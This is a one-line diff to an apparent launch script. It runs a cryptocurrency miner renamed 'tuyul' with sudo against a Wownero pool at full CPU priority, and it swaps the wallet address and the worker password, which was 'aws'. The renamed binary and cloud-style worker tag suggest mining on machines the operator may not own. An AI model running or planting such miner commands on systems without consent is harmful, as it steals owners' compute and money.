@@ -1,1 +1,1 @@
-sudo ./tuyul -a rx/wow --url wownero.herominers.com:10661 --user So2ifgjqGMZJhCrqpFMotQQAiJAiATuJLNAK2HrPLoNzK8hkqNbf9t8gmx6bzAQrXRMnWnoELoiD6GTv8guPBRwH5yoRjTWwk912F5gnVBs6 --pass aws --cpu-no-yield -k --cpu-priority 5 --tls
+sudo ./tuyul -a rx/wow --url wownero.herominers.com:10661 --user WW3AncbA4pDZYVSbqNhtg7V58VdrRjZwKijKWPeMryZP4MeVRySPZUVg77EY4AbJhRZwF8ogiZ3rxEvNcGtAX5fk2YVpCd9Bp --pass GTOL --cpu-no-yield -k --cpu-priority 5 --tls
